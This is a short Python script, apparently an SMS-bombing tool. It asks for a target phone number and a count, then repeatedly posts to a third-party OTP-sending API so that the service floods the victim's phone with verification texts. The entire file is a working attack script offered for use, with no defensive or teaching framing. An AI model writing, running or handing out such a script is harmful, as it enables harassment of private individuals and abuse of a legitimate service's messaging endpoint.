




import requests


num=str(input("ENTER TERGET NUMBER[√]"))
limit=int(input("ENTER SMS AMOUNT[√]"))
api="https://developer.quizgiri.xyz/api/v2.0/send-otp"
headers={"Content-type": "application/json"}
data='{"phone":"0'+num+'","country_code":"+880","fcm_token":null}'

for i in range(limit):
     requests.post(api,headers=headers,data=data)
     print(str(i+1)+"[✓]SMS SENT")